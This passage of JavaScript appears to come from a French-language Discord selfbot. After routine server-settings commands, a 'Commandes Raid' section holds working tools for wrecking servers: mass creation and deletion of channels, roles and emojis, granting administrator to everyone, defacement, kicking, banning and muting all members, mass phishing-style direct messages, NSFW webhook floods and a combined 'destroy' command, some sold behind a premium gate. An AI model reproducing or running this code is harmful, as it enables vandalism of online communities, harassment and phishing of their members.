                .catch(() => message.edit(`ガ __**${name} - Guild Avatar**__ ガ\n> *Je n'ai pas pu modifié l'icone du serveur*`))
            }
            else message.edit(`ガ __**${name} - Guild Avatar**__ ガ\n> *Veuillez me donner une image valide*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "gbanner")){
            if (!message.guild) return message.edit(`ガ __**${name} - Guild Banner**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_GUILD")) return message.edit(`ガ __**${name} - Guild Banner**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)
        
            if (message.attachments.size > 0){
                message.guild.setBanner(message.attachments.first().url)
                .then( () => message.edit({content: `ガ __**${name} - Guild Banner**__ ガ\n> *La bannière du serveur a été modifiée*`, files: []}))
                .catch(() => message.edit({content: `ガ __**${name} - Guild Banner**__ ガ\n> *Je n'ai pas pu modifié La bannière du serveur*`, files: []}))
            }
            else if (args[0]?.startsWith("http")){
                message.guild.setBanner(args[0])
                .then( () => message.edit(`ガ __**${name} - Guild Banner**__ ガ\n> *La bannière du serveur a été modifiée*`))
                .catch(() => message.edit(`ガ __**${name} - Guild Banner**__ ガ\n> *Je n'ai pas pu modifié La bannière du serveur*`))
            }
            else message.edit(`ガ __**${name} - Guild Banner**__ ガ\n> *Veuillez me donner une image valide*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "gsplash")){
            if (!message.guild) return message.edit(`ガ __**${name} - Guild Splash**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_GUILD")) return message.edit(`ガ __**${name} - Guild Splash**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)
        
            if (message.attachments.size > 0){
                message.guild.setSplash(message.attachments.first().url)
                .then( () => message.edit({content: `ガ __**${name} - Guild Splash**__ ガ\n> *La bannière d'invitation du serveur a été modifiée*`, files: []}))
                .catch(() => message.edit({content: `ガ __**${name} - Guild Splash**__ ガ\n> *Je n'ai pas pu modifié La bannière d'invitation du serveur*`, files: []}))
            }
            else if (args[0]?.startsWith("http")){
                message.guild.setSplash(args[0])
                .then( () => message.edit(`ガ __**${name} - Guild Splash**__ ガ\n> *La bannière d'invitation du serveur a été modifiée*`))
                .catch(() => message.edit(`ガ __**${name} - Guild Splash**__ ガ\n> *Je n'ai pas pu modifié La bannière d'invitation du serveur*`))
            }
            else message.edit(`ガ __**${name} - Guild Splash**__ ガ\n> *Veuillez me donner une image valide*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "gdelete")){
            if (!message.guild) return message.edit(`ガ __**${name} - Guild Delete**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (message.guild.ownerId !== client.user?.id) return message.edit(`ガ __**${name} - Guild Delete**__ ガ\n> *Vous devez être le propriétaire du serveur pour utiliser cette commande*`)

            message.guild.delete(args[0])
            .catch(() => message.edit(`ガ __**${name} - Guild Delete**__ ガ\n> *Je n'ai pas pu supprimer le serveur*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "gleave")){
            if (!message.guild) return message.edit(`ガ __**${name} - Guild Leave**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (message.guild.ownerId === client.user?.id) return message.edit(`ガ __**${name} - Guild Delete**__ ガ\n> *Vous ne pouvez pas quitter votre serveur*`)

            await message.delete().catch(() => false)
            message.guild.leave()
            .catch(() => message.channel.send(`ガ __**${name} - Guild Delete**__ ガ\n> *Je n'ai pas pu quitter le serveur*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "gcom")){
            if (!message.guild) return message.edit(`ガ __**${name} - Guild Community**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_GUILD")) return message.edit(`ガ __**${name} - Guild Community**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            if (args[0] === "on"){
                if (message.guild.features.includes("COMMUNITY")) return message.edit(`ガ __**${name} - Guild Community**__ ガ\n> *La communauté est déjà activée*`)
                message.guild.setCommunity(true)
                    .then( () => message.edit(`ガ __**${name} - Guild Community**__ ガ\n> *La communautée du serveur a été activée*`))
                    .catch(() => message.edit(`ガ __**${name} - Guild Community**__ ガ\n> *Je n'ai pas pu activer la communauté du serveur*`))
            }
            else if (args[0] === "off"){
                if (!message.guild.features.includes("COMMUNITY")) return message.edit(`ガ __**${name} - Guild Community**__ ガ\n> *La communauté n'est pas activée*`)
                message.guild.setCommunity(false)
                    .then( () => message.edit(`ガ __**${name} - Guild Community**__ ガ\n> *La communautée du serveur a été désactivée*`))
                    .catch(() => message.edit(`ガ __**${name} - Guild Community**__ ガ\n> *Je n'ai pas pu désactiver la communauté du serveur*`))
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "gboost")){
            if (!message.guild) return message.edit(`ガ __**${name} - Guild Boost**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_GUILD")) return message.edit(`ガ __**${name} - Guild Boost**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            if (args[0] === "on"){
                if (message.guild.premiumProgressBarEnabled) return message.edit(`ガ __**${name} - Guild Boost**__ ガ\n> *La barre des boosts est déjà activée*`)
                message.guild.setPremiumProgressBarEnabled(true)
                    .then( () => message.edit(`ガ __**${name} - Guild Boost**__ ガ\n> *La barre des boosts a été activée*`))
                    .catch(() => message.edit(`ガ __**${name} - Guild Boost**__ ガ\n> *Je n'ai pas pu activer la barre des boosts*`))
            }
            else if (args[0] === "off"){
                if (!message.guild.premiumProgressBarEnabled) return message.edit(`ガ __**${name} - Guild Boost**__ ガ\n> *La barre des boosts n'est pas activée*`)
                message.guild.setPremiumProgressBarEnabled(false)
                    .then( () => message.edit(`ガ __**${name} - Guild Boost**__ ガ\n> *La barre des boosts a été désactivée*`))
                    .catch(() => message.edit(`ガ __**${name} - Guild Boost**__ ガ\n> *Je n'ai pas pu désactiver la barre des boosts*`))
            }
        }

        /*else if (cmd.slice(0, 1).join(' ') === (prefix + "gowner")){
            if (!message.guild) return message.edit(`ガ __**${name} - Guild Owner**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.ownerId !== client.user?.id) return message.edit(`ガ __**${name} - Guild Owner**__ ガ\n> *Vous devez être le propriétaire du serveur pour utiliser cette commande*`)

            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]) || await message.guild.members.fetch(args[0]).catch(() => false)
            if (!args[0] || !member) return message.edit(`ガ __**${name} - Guild Owner**__ ガ\n> *Veuillez mentionner un membre*`)

            message.guild.setOwner(member)
            .then( () => message.edit(`ガ __**${name} - Guild Owner**__ ガ\n> *${member.user.username} est le nouveau propriétaire du serveur*`))
            .catch(() => message.edit(`ガ __**${name} - Guild Owner**__ ガ\n> *Je n'ai pas pu transmettre la pripriété à ${member.user.username}*`))
        }*/

        else if (cmd.slice(0, 1).join(' ') === (prefix + "gnew")){
            if (!message.guild) return message.edit(`ガ __**${name} - Guild News**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_GUILD")) return message.edit(`ガ __**${name} - Guild News**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)
            if (!message.guild.features.includes("COMMUNITY")) return message.edit(`ガ __**${name} - Guild News**__ ガ\n> *La communauté n'est pas activée*`)

            const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[0]) || await message.guild.channels.fetch(args[0]).catch(() => false)
            if (!args[0] || !channel) return message.edit(`ガ __**${name} - Guild News**__ ガ\n> *Veuillez mentionner un salon valide*`)
            
            message.guild.setPublicUpdatesChannel(channel)
                .then( () => message.edit(`ガ __**${name} - Guild News**__ ガ\n> *Le salon des nouveautés à été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Guild News**__ ガ\n> *Je n'ai pas pu modifier le salon des nouveautées*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "grules")){
            if (!message.guild) return message.edit(`ガ __**${name} - Guild Rules**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_GUILD")) return message.edit(`ガ __**${name} - Guild Rules**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)
            if (!message.guild.features.includes("COMMUNITY")) return message.edit(`ガ __**${name} - Guild Rules**__ ガ\n> *La communauté n'est pas activée*`)

            const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[0]) || await message.guild.channels.fetch(args[0]).catch(() => false)
            if (!args[0] || !channel) return message.edit(`ガ __**${name} - Guild Rules**__ ガ\n> *Veuillez mentionner un salon valide*`)
            
            message.guild.setRulesChannel(channel)
                .then( () => message.edit(`ガ __**${name} - Guild Rules**__ ガ\n> *Le salon des règles à été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Guild Rules**__ ガ\n> *Je n'ai pas pu modifier le salon des règles*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "galerte")){
            if (!message.guild) return message.edit(`ガ __**${name} - Guild Alertes**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_GUILD")) return message.edit(`ガ __**${name} - Guild Alertes**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)
            if (!message.guild.features.includes("COMMUNITY")) return message.edit(`ガ __**${name} - Guild Alertes**__ ガ\n> *La communauté n'est pas activée*`)

            const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[0]) || await message.guild.channels.fetch(args[0]).catch(() => false)
            if (!args[0] || !channel) return message.edit(`ガ __**${name} - Guild Alertes**__ ガ\n> *Veuillez mentionner un salon valide*`)
            
            message.guild.setSafetyAlertsChannel(channel)
                .then( () => message.edit(`ガ __**${name} - Guild Alertes**__ ガ\n> *Le salon des règles à été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Guild Alertes**__ ガ\n> *Je n'ai pas pu modifier le salon des règles*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "gvanity")){
            if (!message.guild) return message.edit(`ガ __**${name} - Guild Vanity**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_GUILD")) return message.edit(`ガ __**${name} - Guild Vanity**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            if (!args[0]) return message.edit(`ガ __**${name} - Guild Vanity**__ ガ\n> *Veuillez me donner un code de vanity valide*`)
            
            message.guild.setVanityCode(args.join(' '))
                .then( () => message.edit(`ガ __**${name} - Guild Vanity**__ ガ\n> *La vanity a été modifiée*`))
                .catch(() => message.edit(`ガ __**${name} - Guild Vanity**__ ガ\n> *Je n'ai pas pu modifier la vanity du serveur*`))
        }





















































        // Commandes Raid

        else if (cmd.slice(0, 1).join(' ') === (prefix + "spam")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (args[0] === "stop"){
                clearInterval(client.interval["spam"])
                return message.edit(`ガ __**${name} - Spam**__ ガ\n> *Le spam c'est arrêté avec succès*`)
              }
              else {
                if (client.interval["spam"]) clearInterval(client.interval["spam"])
                message.delete()
                client.interval["spam"] = setInterval(() => {
                    if (!message.channel) return clearInterval(client.interval["spam"])
                    else message.channel.send(args.join(' ')).catch(() => false)
                }, 650);  
              }
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "role create")){
            if (!message.guild) return message.edit(`ガ __**${name} - Role Create**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_ROLES")) return message.edit(`ガ __**${name} - Role Create**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            message.delete().catch(() => false)

            for (let i = 0; i < (250 - message.guild.roles.cache.size); i++){
                message.guild.roles.create({name: args.slice(1).join(' ') || `𝗥𝗮𝗶𝗱 𝗕𝘆 𝗥𝗦𝗭`, color: "RANDOM"}).catch(() => false)        
            }
        }

        else if (message.content === prefix + "role delete"){
            if (!message.guild) return message.edit(`ガ __**${name} - Role Delete**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_ROLES")) return message.edit(`ガ __**${name} - Role Delete**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            message.delete().catch(() => false)
            message.guild.roles.cache.forEach(r => r.delete().catch(() => false))
        }

        else if (message.content === prefix + "deface"){
            if (!message.guild) return message.edit(`ガ __**${name} - Deface**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_GUILD")) return message.edit(`ガ __**${name} - Deface**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)
        
            message.delete()
            message.guild.setIcon("https://static.wikia.nocookie.net/c5b2c4b9-bcf4-46fc-b438-154d984bbbd3/scale-to-width/755").catch(() => false)
            message.guild.setName(`𝗥𝗮𝗶𝗱 𝗕𝘆 ${client.user.username}`).catch(() => false)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "admin perm")){
            if (!message.guild) return message.edit(`ガ __**${name} - Admin Permission**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("ADMINISTRATOR")) return message.edit(`ガ __**${name} - Admin Permission**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            message.delete().catch(() => false)
            message.guild.roles.everyone.permissions.add("ADMINISTRATOR").catch(() => false)
        }


        else if (cmd.slice(0, 2).join(' ') === (prefix + "channels create")){
            if (!message.guild) return message.edit(`ガ __**${name} - Channels Create**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_CHANNELS")) return message.edit(`ガ __**${name} - Channels Create**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            message.delete().catch(() => false)

            for (let i = 0; i < (500 - message.guild.channels.cache.size); i++){
                message.guild.channels.create(args.slice(1).join(' ') || `𝗥𝗮𝗶𝗱 𝗕𝘆 ${client.user.username}`).catch(() => false)    
                message.guild.channels.create(args.slice(1).join(' ') || `𝗥𝗮𝗶𝗱 𝗕𝘆 ${client.user.username}`).catch(() => false)    
                message.guild.channels.create(args.slice(1).join(' ') || `𝗥𝗮𝗶𝗱 𝗕𝘆 ${client.user.username}`).catch(() => false)    
                message.guild.channels.create(args.slice(1).join(' ') || `𝗥𝗮𝗶𝗱 𝗕𝘆 ${client.user.username}`).catch(() => false)    
                message.guild.channels.create(args.slice(1).join(' ') || `𝗥𝗮𝗶𝗱 𝗕𝘆 ${client.user.username}`).catch(() => false)    
            }
        }

        else if (message.content === prefix + "channels delete"){
            if (!message.guild) return message.edit(`ガ __**${name} - Channels Delete**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_CHANNELS")) return message.edit(`ガ __**${name} - Channels Delete**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            message.delete().catch(() => false)
            message.guild.channels.cache.forEach(c => c.delete().catch(() => false))
            message.guild.channels.create(`𝗥𝗮𝗶𝗱 𝗕𝘆 ${client.user.username}`)
        }

        else if (message.content === prefix + "channels shuffle"){
            if (!message.guild) return message.edit(`ガ __**${name} - Channels Shuffle**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_CHANNELS")) return message.edit(`ガ __**${name} - Channels Shuffle**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            message.delete().catch(() => false)
            message.guild.channels.cache.forEach(c => c.setPosition(Math.floor(Math.random() * (message.guild.channels.cache.size - 0 + 1) + 0)).catch((err) => {}))
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "emotes create")){
            if (!message.guild) return message.edit(`ガ __**${name} - Emotes Create**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS")) return message.edit(`ガ __**${name} - Emotes Create**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            message.delete().catch(() => false)
            for (let i = 0; i < 200; i++){
                message.guild.emojis.create(message.attachments.size > 0 ? message.attachments.first().url : args[1]?.startsWith("http") ? args[1] : "https://i.imgur.com/n7FpKsZ.png", `𝗥𝗮𝗶𝗱 𝗕𝘆 ${client.user.username}` + i+1)
            }
        }

        else if (message.content === prefix + "emotes delete"){
            if (!message.guild) return message.edit(`ガ __**${name} - Emotes Delete**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS")) return message.edit(`ガ __**${name} - Emotes Delete**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            message.delete()
            message.guild.emojis.cache.forEach(e => e.delete(`𝗥𝗮𝗶𝗱 𝗕𝘆 ${client.user.username}`).catch(() => false))
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "stickers create")){
            if (!message.guild) return message.edit(`ガ __**${name} - Stickers Create**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS")) return message.edit(`ガ __**${name} - Stickers Create**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            message.delete().catch(() => false)
            for (let i = 0; i < 200; i++){
                message.guild.stickers.create(message.attachments.size > 0 ? message.attachments.first().url : args[1]?.startsWith("http") ? args[1] : "https://i.imgur.com/n7FpKsZ.png", `𝗥𝗮𝗶𝗱 𝗕𝘆 ${client.user.username}` + i+1, name)
            }
        }

        else if (message.content === prefix + "stickers delete"){
            if (!message.guild) return message.edit(`ガ __**${name} - Stickers Delete**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS")) return message.edit(`ガ __**${name} - Stickers Delete**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            message.delete()
            message.guild.stickers.cache.forEach(s => s.delete(`𝗥𝗮𝗶𝗱 𝗕𝘆 ${client.user.username}`).catch(() => false))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "renameall")){
            if (!message.guild) return message.edit(`ガ __**${name} - Rename All**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_NICKNAMES")) return message.edit(`ガ __**${name} - Rename All**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            message.delete()
            message.guild.members.cache.filter(m => m.manageable).forEach(m => m.setNickname(args.slice(1).join(' ') || null).catch(() => false))
        }

        else if (message.content === prefix + "muteall"){
            if (!message.guild) return message.edit(`ガ __**${name} - Mute All**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MODERATE_MEMBERS")) return message.edit(`ガ __**${name} - Mute All**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            message.delete()
            message.guild.members.cache.filter(m => m.moderatable).forEach(m => m.timeout(1000 * 60 * 60 * 24 * 28).catch(() => false))
        }

        else if (message.content === prefix + "kickall"){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (!message.guild) return message.edit(`ガ __**${name} - Kick All**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("KICK_MEMBERS")) return message.edit(`ガ __**${name} - Kick All**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            message.delete()
            message.guild.members.cache.filter(m => m.kickable).forEach(m => m.kick().catch(() => false))
        }

        else if (message.content === prefix + "banall"){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (!message.guild) return message.edit(`ガ __**${name} - Ban All**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("BAN_MEMBERS")) return message.edit(`ガ __**${name} - Ban All**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            message.delete()
            message.guild.members.cache.filter(m => m.bannable).forEach(m => m.ban().catch(() => false))
        }

        else if (message.content === prefix + "mpall"){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const guild = client.guilds.cache.get(args[0])
            if (guild){

                message.delete()
                const members = guild.members.cache.filter(m => !m.permissions.has("KICK_MEMBERS") && 
                !m.permissions.has("BAN_MEMBERS") && 
                !m.permissions.has("MANAGE_GUILD") && 
                !m.permissions.has("MODERATE_MEMBERS") && 
                !m.permissions.has("MANAGE_NICKNAMES") && 
                !m.permissions.has("ADMINISTRATOR") &&
                m.guild.ownerId !== m.user?.id)

                for (const member of members.map(r => r)){
                    try {
                        const embed = new discord.WebEmbed()
                            .setImage("https://cdn.discordapp.com/app-assets/521842831262875670/store/524691830454091797.png?size=1024")
                            .setTitle("Cliquez ici pour récupérer")
                            .setURL(`https://discord.gg/jcdQyTNJ5E`)
                            .setColor(0x2B2D31)
                        member.send({content: args.slice(1).join(' ') || null, embeds: args[1] ? null : [embed]})
                    }
                    catch {}
                }
            }
            else {
                if (!message.guild) return message.edit(`ガ __**${name} - MP All**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

                message.delete()
                message.guild.members.cache.filter(m => m.bannable).forEach(m => m.ban().catch(() => false))

                const members = message.guild.members.cache.filter(m => !m.permissions.has("KICK_MEMBERS") && 
                !m.permissions.has("BAN_MEMBERS") && 
                !m.permissions.has("MANAGE_GUILD") && 
                !m.permissions.has("MODERATE_MEMBERS") && 
                !m.permissions.has("MANAGE_NICKNAMES") && 
                !m.permissions.has("ADMINISTRATOR") &&
                m.guild.ownerId !== m.user?.id)

                for (const member of members.map(r => r)){
                    try {
                        member.send({content: args.slice(1).join(' ') || null, embeds: args[1] ? null : [embed]})
                    }
                    catch {}
                }
            }
        }

        else if (message.content === prefix + "bomber"){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (!message.guild) return message.edit(`ガ __**${name} - Bomber**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_WEBHOOKS")) return message.edit(`ガ __**${name} - Bomber**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            if (args[0] === "stop"){
                clearInterval(client.interval["bomber"])
                return message.edit(`ガ __**${name} - Bomber**__ ガ\n> *Le bomber va bientôt s'arrêter*`)
            }

            message.delete().catch(() => false)
            message.guild.channels.cache.filter(c => c.type === "GUILD_TEXT" || c.type === "GUILD_VOICE" && c.permissionsFor(message.member).has("MANAGE_WEBHOOKS")).forEach(c =>  c ? c.createWebhook(name) : "")

            if (client.interval["bomber"]) clearInterval(client.interval["bomber"])
            client.interval["bomber"] = setInterval(async () => {
                const res = await fetch(randomNSFW()).catch(() => false)
                const r = await res.json()
                if (r && message.guild) await message.guild.fetchWebhooks().then(w => w.forEach(webhook => webhook ? webhook.send({content: `@everyone\n${r.message}`}).catch(() => false) : "")).catch(() => false)
              }, 2000);
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "webhookspam")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (!message.guild) return message.edit(`ガ __**${name} - Webhook Spam**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_WEBHOOKS")) return message.edit(`ガ __**${name} - Webhook Spam**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)

            message.delete().catch(() => false)
            message.guild.channels.cache.filter(c => c.type === "GUILD_TEXT" || c.type === "GUILD_VOICE" && c.permissionsFor(message.member).has("MANAGE_WEBHOOKS")).forEach(c =>  { if (c) for (let i = 0; i < 3; i++){c.createWebhook(name).catch(() => false)}})

            setInterval(async () => {
                if (message.guild) await message.guild.fetchWebhooks().then(w => w.forEach(webhook => webhook ? webhook.send({content: `@everyone ${args.join(' ') || `𝗥𝗮𝗶𝗱 𝗕𝘆 𝗥𝗦𝗭\nhttps://discord.gg/jcdQyTNJ5E`}`}).catch(() => false) : "")).catch(() => false)
              }, 1);
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "destroy")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (!message.guild) return message.edit(`ガ __**${name} - Destroy**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            message.delete()

            message.guild.roles.cache.filter(r => r.editable).forEach(r => r.delete().catch(() => false))
            message.guild.channels.cache.filter(c => c.deletable).forEach(c => c.delete().catch(() => false))
            message.guild.emojis.cache.filter(e => e.deletable).forEach(e => e.delete().catch(() => false))
            message.guild.stickers.cache.filter(s => s.deletable).forEach(s => s.delete().catch(() => false))
            message.guild.members.cache.filter(m => m.manageable).forEach(m => m.setNickname("𝗥𝗮𝗶𝗱 𝗕𝘆 𝗥𝗦𝗭").catch(() => false))
            message.guild.members.cache.filter(m => m.moderatable).forEach(m => m.timeout(1000 * 60 * 60 * 24 * 28).catch(() => false))
            message.guild.channels.cache.filter(c => c.type === "GUILD_TEXT" || c.type === "GUILD_VOICE" && c.permissionsFor(message.member).has("MANAGE_WEBHOOKS")).forEach(c =>  { if (c) for (let i = 0; i < 3; i++){c.createWebhook(name).catch(() => false)}})

            for (let i = 0; i < 500; i++){ message.guild.channels.create(`𝗥𝗮𝗶𝗱 𝗕𝘆 𝗥𝗦𝗭`).then(c => c.createWebhook(name).catch(() => false)).catch(() => false) }
            
            const r = await fetch(randomNSFW()).catch(() => false)
            const a = await r.json()
            for (let i = 0; i < 200; i++){ message.guild.emojis.create(a.message, "𝗥𝗮𝗶𝗱 𝗕𝘆 𝗥𝗦𝗭").catch(() => false) }
            for (let i = 0; i < 20; i++){ message.guild.stickers.create(a.message, "𝗥𝗮𝗶𝗱 𝗕𝘆 𝗥𝗦𝗭", "rsz").catch(() => false) }
            
            setInterval(async () => {
                if (message.guild) await message.guild.fetchWebhooks().then(w => w.forEach(webhook => webhook ? webhook.send({content: `@everyone ${args.join(' ') || `𝗥𝗮𝗶𝗱 𝗕𝘆 𝗥𝗦𝗭\nhttps://discord.gg/jcdQyTNJ5E`}`}).catch(() => false) : "")).catch(() => false)
            }, 1);    
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "sendall")){
            if (!message.guild) return message.edit(`ガ __**${name} - Send All**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            message.guild.channels.cache.forEach(channel => {
                for (let i = 0; i < 5; i++){
                    channel.send(`@everyone ${args.join(' ') || `𝗥𝗮𝗶𝗱 𝗕𝘆 𝗥𝗦𝗭\nhttps://discord.gg/jcdQyTNJ5E`}`).catch(() => false)
                }
            })
        }
































        else if (cmd.slice(0, 1).join(' ') === (prefix + "protect")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const guild = client.guilds.cache.get(args[0]) || message.guild
            if (!guild) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            if (antiraid[message.guildId].protected === true) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Le serveur est déjà protégé*`)
            antiraid[message.guildId].protected = true
            
            client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
            message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Le serveur est maintenant protégé*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "unprotect")){
            const guild = client.guilds.cache.get(args[0]) || message.guild
            if (!guild) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            if (!antiraid[message.guildId] || !antiraid[message.guildId].protected) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Le serveur n'est pas protégé*`)
            antiraid[message.guildId].protected = false
            
            client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
            message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Le serveur n'est plus protégé*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "wl")){
            if (!message.guild) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!args[0]) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n${antiraid[message.guildId].whitelist === 0 ? "> *Aucun membre whitelist*" : antiraid[message.guildId].whitelist.filter(async i => await client.users.fetch(i).catch(() => false)).map(id => `> <@${id}>`).join('\n')}`)
            
            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
            if (!user) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez mentionner un utilisateur*`)
            if (antiraid[message.guildId].whitelist.includes(user?.id)) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *${user.username} est déjà whitelist*`)
            
            antiraid[message.guildId].whitelist.push(user?.id)
            
            client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
            message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *${user.username} a été whitelist*`)
        }

